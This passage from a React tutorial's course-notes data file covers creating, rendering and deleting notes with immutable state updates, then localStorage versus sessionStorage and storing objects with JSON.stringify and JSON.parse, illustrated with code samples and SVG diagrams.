                    <rect x="0" y="0" width="375" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">RIGHT: RECENT NOTES</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">task Master Array</text>

                    <rect x="15" y="74" width="345" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">task = [</text>
                    <text x="35" y="116" class="svg-mono-xs">{ title: "...", details: "..." },</text>
                    <text x="35" y="134" class="svg-mono-xs">{ title: "...", details: "..." }</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">]</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "29.2",
          title: "Immutable Insertion & Clean Form Reset Implementation",
          content: `
            <p>
              Here is the production-grade implementation of the Notes creation pipeline, featuring defensive input trimming, immutable state expansion, and instant form resetting:
            </p>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function NotesApp() {
  // 1. Transient form state
  const [title, setTitle] = useState('');
  const [content, setContent] = useState('');

  // 2. Collection list state (Array of note objects)
  const [notes, setNotes] = useState([
    { id: 1, title: 'React Fiber', content: 'Fiber enables incremental virtual DOM rendering.' }
  ]);

  const handleSubmit = (e) => {
    e.preventDefault(); // Stop full-page reload

    // Defensive guard: prevent blank note creation
    if (!title.trim() || !content.trim()) {
      alert('Please fill out both the title and content fields!');
      return;
    }

    // Create structured note item with timestamp
    const newNote = {
      id: Date.now(), // Unique identifier
      title: title.trim(),
      content: content.trim(),
      createdAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    // Pure immutable state update: prepend new note to array
    setNotes(prevNotes => [newNote, ...prevNotes]);

    // Clean form reset
    setTitle('');
    setContent('');
  };

  return (
    &lt;div className="max-w-4xl mx-auto p-6 grid grid-cols-1 md:grid-cols-2 gap-8"&gt;
      {/* Left Column: Form Panel */}
      &lt;div className="p-6 bg-card border rounded-xl shadow-sm"&gt;
        &lt;h3 className="text-lg font-bold mb-4"&gt;Create New Note&lt;/h3&gt;
        &lt;form onSubmit={handleSubmit} className="flex flex-col gap-4"&gt;
          &lt;input 
            type="text"
            placeholder="Note Title"
            value={title}
            onChange={(e) => setTitle(e.target.value)}
            className="border p-2.5 rounded font-medium focus:ring-2 focus:ring-emerald-500"
          /&gt;
          &lt;textarea 
            placeholder="Write your note contents..."
            value={content}
            onChange={(e) => setContent(e.target.value)}
            rows={4}
            className="border p-2.5 rounded resize-none focus:ring-2 focus:ring-emerald-500"
          /&gt;
          &lt;button 
            type="submit"
            className="bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-2.5 rounded transition"
          &gt;
            Add Note Card
          &lt;/button&gt;
        &lt;/form&gt;
      &lt;/div&gt;

      {/* Right Column: Active Count */}
      &lt;div className="flex flex-col justify-center items-center p-6 bg-surface border rounded-xl"&gt;
        &lt;span className="text-4xl font-mono font-bold text-emerald-600"&gt;{notes.length}&lt;/span&gt;
        &lt;span className="text-sm text-text-muted mt-1 uppercase tracking-wide"&gt;Total Active Notes&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  );
}

export default NotesApp;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 29.2 · 5-Step Immutable Note Append Pipeline</span>
                <span class="diagram-frame-tag">MUTATION GUARD PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Diagram showing 5-step immutable note submission pipeline">
                  <!-- Step 1 -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="150" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="75" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">STEP 1</text>
                    <text x="75" y="52" text-anchor="middle" class="svg-title">preventDefault()</text>
                    <rect x="10" y="66" width="130" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="75" y="105" text-anchor="middle" class="svg-mono-xs">Stops Reload</text>
                  </g>

                  <line x1="185" y1="100" x2="205" y2="100" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="205,96 213,100 205,104" fill="var(--primary)"/>

                  <!-- Step 2 -->
                  <g transform="translate(218, 25)">
                    <rect x="0" y="0" width="150" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="75" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">STEP 2</text>
                    <text x="75" y="52" text-anchor="middle" class="svg-title">[...task]</text>
                    <rect x="10" y="66" width="130" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="75" y="105" text-anchor="middle" class="svg-mono-xs">Clones Array</text>
                  </g>

                  <line x1="378" y1="100" x2="398" y2="100" stroke="var(--accent)" stroke-width="2"/>
                  <polygon points="398,96 406,100 398,104" fill="var(--accent)"/>

                  <!-- Step 3 -->
                  <g transform="translate(411, 25)">
                    <rect x="0" y="0" width="150" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="75" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">STEP 3</text>
                    <text x="75" y="52" text-anchor="middle" class="svg-title">copy.push(obj)</text>
                    <rect x="10" y="66" width="130" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="75" y="105" text-anchor="middle" class="svg-mono-xs">Appends Note</text>
                  </g>

                  <line x1="571" y1="100" x2="591" y2="100" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="591,96 599,100 591,104" fill="var(--success)"/>

                  <!-- Step 4 -->
                  <g transform="translate(604, 25)">
                    <rect x="0" y="0" width="130" height="150" rx="8" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.6"/>
                    <text x="65" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">STEP 4</text>
                    <text x="65" y="52" text-anchor="middle" class="svg-title">setTask(copy)</text>
                    <rect x="8" y="66" width="114" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="65" y="105" text-anchor="middle" class="svg-mono-xs">Triggers Render</text>
                  </g>

                  <line x1="744" y1="100" x2="759" y2="100" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="759,96 767,100 759,104" fill="var(--success)"/>

                  <!-- Step 5 -->
                  <g transform="translate(772, 25)">
                    <rect x="0" y="0" width="85" height="150" rx="8" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="42" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">STEP 5</text>
                    <text x="42" y="52" text-anchor="middle" class="svg-title">Reset</text>
                    <rect x="6" y="66" width="73" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="42" y="105" text-anchor="middle" class="svg-mono-xs">Clears Input</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 30
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-30-rendering-notes-deleting-splice",
      number: "30",
      shortLabel: "Rendering Cards & Deleting Notes",
      title: "Rendering Note Cards & Deleting Notes With .splice(idx, 1) vs. .filter()",
      summary: "Rendering collections via .map(), the subtle mutation flaw of Array.prototype.splice() in React state, and the pure immutable deletion standard using .filter().",
      subtopicLabels: ["30.1 Rendering With .map()", "30.2 .splice() vs .filter()"],
      diagramCount: 2,
      sections: [
        {
          num: "30.1",
          title: "Rendering Collection Grids With .map() & Unique Keys",
          content: `
            <p>
              To render an arbitrary number of note cards dynamically, React developers iterate through the state array using JavaScript's pure <code>.map()</code> function.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Golden Requirements for Rendering Lists:</strong>
                <ul class="notes-sub-list">
                  <li>Every top-level element returned from <code>.map()</code> <strong>must have a unique, stable <code>key</code> prop</strong> (such as <code>note.id</code>).</li>
                  <li><strong>Why Never Use Array Index as Key for Deletions:</strong> If you use <code>key={index}</code> and delete the item at index 0, React confuses the identities of the remaining items, causing ghost input values, animation glitches, and broken DOM synchronization!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 30.1 · Array Deletion: Targeted Splice & State Re-render</span>
                <span class="diagram-frame-tag">DELETION RECONCILIATION FLOW</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing delete button clicking with index, splice removing item from copy, and state re-rendering">
                  <!-- User Click -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">1 · DELETE TRIGGER</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">deleteNote(idx)</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">Target Index: 1</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-sub">Click event receives index</text>
                  </g>

                  <!-- Splice Action -->
                  <g transform="translate(315, 25)">
                    <rect x="0" y="0" width="250" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="125" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2 · IMMUTABLE SPLICE</text>
                    <text x="125" y="52" text-anchor="middle" class="svg-title">copy.splice(idx, 1)</text>
                    <rect x="15" y="66" width="220" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="125" y="94" text-anchor="middle" class="svg-mono-xs">Removes 1 item at idx</text>
                    <text x="125" y="114" text-anchor="middle" class="svg-sub">New array length: n - 1</text>
                  </g>

                  <!-- Final Re-render -->
                  <g transform="translate(625, 25)">
                    <rect x="0" y="0" width="225" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="112" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">3 · STATE UPDATE</text>
                    <text x="112" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">setTask(copy)</text>
                    <rect x="15" y="66" width="195" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="112" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Target Card Removed</text>
                    <text x="112" y="114" text-anchor="middle" class="svg-sub">Instant surgical patch ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "30.2",
          title: "The .splice() Mutation Trap vs. Pure Immutable .filter()",
          content: `
            <p>
              In traditional JavaScript courses, deleting an element at an index is taught using <code>array.splice(index, 1)</code>. However, in React, <strong>using <code>splice()</code> on state is an architectural anti-pattern</strong>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Why <code>notes.splice(index, 1)</code> Fails in React:</strong>
                <ul class="notes-sub-list">
                  <li><code>Array.prototype.splice()</code> is a <strong>mutating method</strong>—it alters the original array directly in memory.</li>
                  <li>If you do <code>notes.splice(idx, 1); setNotes(notes);</code>, the memory reference of <code>notes</code> has not changed! React performs its equality check: <code>Object.is(prevNotes, nextNotes)</code> &rarr; <code>true</code> &rarr; React bails out and refuses to update the UI!</li>
                  <li>Even if you clone the array first with <code>const copy = [...notes]; copy.splice(idx, 1); setNotes(copy);</code>, it requires multi-line ceremony.</li>
                </ul>
              </li>
              <li><strong>The Senior Standard — Pure <code>.filter()</code>:</strong>
                <ul class="notes-sub-list">
                  <li><code>.filter()</code> never mutates the original array; it always creates and returns a brand-new array containing only the items that pass the predicate test.</li>
                  <li>Deleting by ID or Index in one elegant, declarative line:
                    <pre class="notes-code-block"><code>// Delete by ID (Best Practice):
const deleteNote = (targetId) => {
  setNotes(prev => prev.filter(note => note.id !== targetId));
};

// Delete by Index:
const deleteByIndex = (targetIndex) => {
  setNotes(prev => prev.filter((_, idx) => idx !== targetIndex));
};</code></pre>
                  </li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function NotesGrid({ initialNotes = [] }) {
  const [notes, setNotes] = useState(initialNotes);

  const handleDelete = (id) => {
    // Pure, immutable deletion without mutating state
    setNotes(prevNotes => prevNotes.filter(note => note.id !== id));
  };

  if (notes.length === 0) {
    return (
      &lt;div className="p-8 text-center border-2 border-dashed rounded-xl text-text-muted"&gt;
        No notes available. Add a new note above to get started!
      &lt;/div&gt;
    );
  }

  return (
    &lt;div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 p-4"&gt;
      {notes.map(note => (
        &lt;div 
          key={note.id} 
          className="p-5 bg-card border rounded-xl shadow-sm flex flex-col justify-between"
        &gt;
          &lt;div&gt;
            &lt;h4 className="font-bold text-lg text-text-primary"&gt;{note.title}&lt;/h4&gt;
            &lt;p className="mt-2 text-sm text-text-secondary leading-relaxed"&gt;{note.content}&lt;/p&gt;
          &lt;/div&gt;
          &lt;div className="mt-4 pt-3 border-t flex justify-between items-center"&gt;
            &lt;span className="text-xs text-text-muted"&gt;{note.createdAt}&lt;/span&gt;
            &lt;button 
              onClick={() => handleDelete(note.id)}
              className="px-2.5 py-1 text-xs font-semibold text-red-600 hover:bg-red-50 dark:hover:bg-red-950 rounded transition"
            &gt;
              Delete Note
            &lt;/button&gt;
          &lt;/div&gt;
        &lt;/div&gt;
      ))}
    &lt;/div&gt;
  );
}

export default NotesGrid;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 30.2 · In-Memory State vs. Browser Persistence (LocalStorage Preview)</span>
                <span class="diagram-frame-tag">STORAGE ARCHITECTURE EVOLUTION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting RAM in-memory state with persistent browser localStorage">
                  <!-- Memory State -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <rect x="15" y="15" width="182" height="20" rx="4" fill="var(--border)"/>
                    <text x="106" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">CURRENT: VOLATILE RAM</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title">useState In-Memory Heap</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">• Notes exist only in JavaScript memory</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--danger);">• Browser reload wipes all added notes</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">State resets to initial useState([])</text>
                  </g>

                  <!-- LocalStorage -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="212" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="121" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">NEXT CHAPTER: PERSISTENCE</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Browser localStorage API</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs">• JSON.stringify() saves to disk</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• Survives page reloads & closes ✓</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">Hydrates useState on initial mount</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 31
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-31-browser-storage-local-session",
      number: "31",
      shortLabel: "Browser Storage — Local vs Session",
      title: "Browser Storage — LocalStorage vs. SessionStorage & Core Methods",
      summary: "Client-side key-value storage mechanisms, lifespan and scope comparison between localStorage and sessionStorage, synchronous API blocking gotchas, and the 4 fundamental CRUD methods.",
      subtopicLabels: ["31.1 Local vs Session Storage", "31.2 4 Core Storage Methods"],
      diagramCount: 2,
      sections: [
        {
          num: "31.1",
          title: "LocalStorage vs. SessionStorage Lifespan & Scope",
          content: `
            <p>
              When a user interacts with a React application, standard React state (<code>useState</code>) lives exclusively in the browser's <strong>volatile RAM memory</strong>. The instant the user hits refresh (F5), closes the tab, or shuts down their computer, all memory state evaporates into thin air.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Why We Need Web Storage APIs:</strong>
                <ul class="notes-sub-list">
                  <li>To preserve user settings (e.g. Dark Mode preferences, unfinished draft forms, shopping cart items) across page reloads without making expensive network calls to a cloud database every second.</li>
                </ul>
              </li>
              <li><strong>SessionStorage Mechanics:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Lifespan:</strong> Scoped strictly to the lifetime of the <strong>active browser tab</strong>.</li>
                  <li>Survives page reloads within the same tab, but the moment the tab or browser window is closed, all data is automatically erased.</li>
                  <li>Opening the same URL in a new tab creates a completely separate, isolated <code>sessionStorage</code> instance.</li>
                </ul>
              </li>
              <li><strong>LocalStorage Mechanics:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Lifespan:</strong> <strong>Permanent</strong> persistence scoped to the origin (protocol + domain + port).</li>
                  <li>Data persists across tab closes, browser restarts, and even computer reboots until explicitly cleared by the user or programmatically by your code.</li>
                  <li>Shared synchronously across all open tabs of the same origin.</li>
                  <li><strong>Capacity:</strong> Typically <strong>~5MB to 10MB</strong> per origin (vastly larger than the 4KB limit of HTTP cookies).</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 31.1 · Browser Client Storage Comparison: LocalStorage vs. SessionStorage Lifecycle</span>
                <span class="diagram-frame-tag">CLIENT PERSISTENCE LIFECYCLE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Comparison between SessionStorage ephemeral lifecycle and LocalStorage permanent disk persistence">
                  <!-- SessionStorage -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--warning)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="150" height="22" rx="4" fill="var(--warning-bg)" stroke="var(--warning)" stroke-width="1.2"/>
                    <text x="90" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">SESSIONSTORAGE</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--warning);">Ephemeral Tab Memory</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• Active only while tab stays open</text>
                    <text x="25" y="118" class="svg-mono-xs">• Closing tab wipes 100% of data ⚠</text>
                    <text x="25" y="138" class="svg-mono-xs">• Scoped strictly to current window</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Use Case: One-time form wizards</text>
                  </g>

                  <!-- LocalStorage -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">LOCALSTORAGE</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Permanent Disk Storage</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="98" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• Survives closing tabs &amp; restarts ✓</text>
                    <text x="25" y="118" class="svg-mono-xs">• Shared across all tabs same origin</text>
                    <text x="25" y="138" class="svg-mono-xs">• Capacity: ~5MB - 10MB per origin</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Use Case: Notes, Auth Tokens, Themes</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "31.2",
          title: "The 4 Essential Storage Methods & DevTools Inspection",
          content: `
            <p>
              Both <code>localStorage</code> and <code>sessionStorage</code> share the identical W3C Storage API interface based on <strong>Key-Value string pairs</strong>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The 4 Core Storage Methods:</strong>
                <pre class="notes-code-block"><code>// 1. CREATE / UPDATE: Store a key-value pair (both must be strings)
localStorage.setItem('theme', 'dark');

// 2. READ: Retrieve value by key (returns null if key does not exist)
const currentTheme = localStorage.getItem('theme'); // 'dark'

// 3. DELETE ONE: Remove a specific key
localStorage.removeItem('theme');

// 4. CLEAR ALL: Wipe every key stored under this domain origin
localStorage.clear();</code></pre>
              </li>
              <li><strong>Production Engineering Gotchas:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Synchronous Blocking API:</strong> Web Storage APIs run synchronously on the browser's main UI thread. Reading or writing massive multi-megabyte payloads in LocalStorage will freeze the browser frame rate and cause visible UI stutter. Keep stored items compact and structured!</li>
                  <li><strong>Inspection in Browser DevTools:</strong> Open Chrome DevTools &rarr; Navigate to <strong>Application</strong> tab &rarr; Left sidebar: Expand <strong>Local storage</strong> &rarr; Select your site URL to inspect, edit, or delete keys live in real time!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 31.2 · LocalStorage CRUD Operations &amp; DevTools Application Tab Pipeline</span>
                <span class="diagram-frame-tag">STORAGE PROTOCOL INTERFACE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Visual representation of the 4 CRUD operations interacting with the browser LocalStorage store and DevTools inspection">
                  <!-- JS Operations -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="270" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JS API CALLS</text>
                    <text x="135" y="56" text-anchor="middle" class="svg-title">4 Storage Methods</text>

                    <rect x="15" y="70" width="240" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="92" class="svg-mono-xs">• setItem(key, val)</text>
                    <text x="25" y="112" class="svg-mono-xs">• getItem(key)</text>
                    <text x="25" y="132" class="svg-mono-xs">• removeItem(key)</text>
                    <text x="25" y="152" class="svg-mono-xs">• clear()</text>
                  </g>

                  <!-- Arrow 1 -->
                  <line x1="295" y1="110" x2="325" y2="110" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="325,106 333,110 325,114" fill="var(--primary)"/>

                  <!-- Browser Disk Storage Engine -->
                  <g transform="translate(335, 20)">
                    <rect x="0" y="0" width="250" height="180" rx="10" fill="var(--bg-surface)" stroke="var(--primary)" stroke-width="1.8"/>
                    <text x="125" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">ORIGIN ISOLATED STORE</text>
                    <text x="125" y="52" text-anchor="middle" class="svg-title">Key-Value Pairs</text>

                    <rect x="15" y="68" width="220" height="96" rx="6" fill="var(--bg-subsection)" stroke="var(--border)"/>
                    <text x="25" y="92" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">'user' : 'Sarthak'</text>
                    <text x="25" y="112" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">'theme' : 'dark'</text>
                    <text x="25" y="132" class="svg-mono-xs">• 5MB - 10MB Disk Buffer</text>
                    <text x="25" y="150" class="svg-mono-xs" style="fill:var(--text-muted);">Synchronous Disk Access</text>
                  </g>

                  <!-- Arrow 2 -->
                  <line x1="585" y1="110" x2="615" y2="110" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="615,106 623,110 615,114" fill="var(--success)"/>

                  <!-- Chrome DevTools -->
                  <g transform="translate(625, 20)">
                    <rect x="0" y="0" width="230" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="137" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="83.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">LIVE INSPECTION</text>
                    <text x="115" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Application Tab</text>

                    <rect x="15" y="70" width="200" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs">1. Press F12 / Inspect</text>
                    <text x="25" y="114" class="svg-mono-xs">2. Application tab</text>
                    <text x="25" y="134" class="svg-mono-xs">3. Storage &gt; Local Storage</text>
                    <text x="25" y="152" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">View &amp; Edit Keys Live ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 32
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-32-json-stringify-parse-objects",
      number: "32",
      shortLabel: "JSON.stringify & parse in LocalStorage",
      title: "Storing & Retrieving Objects/Arrays With JSON.stringify & JSON.parse",
      summary: "Solving the [object Object] storage corruption flaw, deep serialization with JSON.stringify, deserialization with JSON.parse, and defensive try-catch fallback handling in React.",
      subtopicLabels: ["32.1 Object Storage Trap", "32.2 JSON.stringify & parse"],
      diagramCount: 2,
      sections: [
        {
          num: "32.1",
          title: "The [object Object] Stringification Trap",
          content: `
            <p>
              A major surprise for junior developers is discovering that <strong>LocalStorage can ONLY store strings</strong>. It has zero native support for JavaScript objects, arrays, booleans, or numbers.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Fatal Mistake:</strong>
                <pre class="notes-code-block"><code>const user = { name: 'Sarthak', role: 'Engineer' };

// ❌ FATAL BUG: Passing object directly into setItem:
localStorage.setItem('user', user);

// When reading it back:
const saved = localStorage.getItem('user');
console.log(saved); // Prints: "[object Object]"! All properties lost forever!</code></pre>
              </li>
              <li><strong>Why Does This Happen?</strong>
                <ul class="notes-sub-list">
                  <li>When JavaScript encounters a non-string value passed into <code>setItem(key, value)</code>, it implicitly calls <code>.toString()</code> on the value.</li>
                  <li>In JavaScript, calling <code>{}.toString()</code> evaluates to the useless string literal <code>"[object Object]"</code>! Your original object data is completely obliterated.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 32.1 · The [object Object] Serialization Trap vs. JSON Stringification</span>
                <span class="diagram-frame-tag">SERIALIZATION DATA INTEGRITY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Contrast between passing raw object resulting in [object Object] failure vs JSON.stringify saving structured JSON string">
                  <!-- BAD: Implicit toString() -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="137" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="83.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">INCORRECT WAY ✕</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Direct Object Coercion</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="98" class="svg-mono-xs">localStorage.setItem('user', user)</text>
                    <text x="25" y="118" class="svg-mono-xs">• Implicitly runs: user.toString()</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">• Stored Value: &quot;[object Object]&quot; ✕</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--danger);">Fatal: All properties erased!</text>
                  </g>

                  <!-- GOOD: JSON.stringify -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="123" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="76.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT WAY ✓</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">JSON Serialization</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
